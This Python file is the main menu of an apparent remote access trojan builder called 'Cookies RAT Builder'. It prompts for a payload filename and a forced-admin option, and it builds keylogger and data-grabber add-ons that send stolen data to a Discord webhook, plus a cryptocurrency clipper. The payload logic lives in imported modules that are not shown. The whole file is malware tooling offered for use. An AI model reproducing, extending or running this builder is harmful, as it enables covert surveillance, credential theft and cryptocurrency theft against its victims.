from colorama import Fore
from util.plugins.common import *
from cookies_package import *
from time import sleep

from util.create_crypto_clipper import Create_Crypto_Clipper
from util.create_payload import CookiesRAT
from util.create_key_logger import Create_KeyLogger
from util.create_data_grabber import Create_Data_Grabber



'''
MAIN MENU
'''
def main():
    clear()
    settitle(f"Cookies RAT Builder")
    
    print(banner)
    choice = str(input(
            f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 
    if choice == '1':       # Create PayLoad
        clear()
        filename = str(input(
            f'{Fore.CYAN}Enter output filename {Fore.YELLOW}>> {Fore.RESET}'))
        force_admin = str(input(
            f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))
        CookiesRAT(filename, force_admin)
        main()

    elif choice == '2':     # Create Custom PayLoad
        clear()
        print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
        sleep(1)
        main()

    elif choice == '3':     # Create Keylogger Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        intervals = str(input(
            f'{Fore.CYAN}Enter intervals (default 60s) {Fore.YELLOW}>> {Fore.RESET}'))
        Create_KeyLogger(webhook, intervals)
        main()

    elif choice == '4':     # Create Data Grabber Add on
        clear()
        webhook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        Create_Data_Grabber(webhook)
        main()

    elif choice == '5':     # Create Crypto Clipper Add on
        clear()
        Create_Crypto_Clipper()
        main()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        clear()
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main()



if __name__ == "__main__":
    main()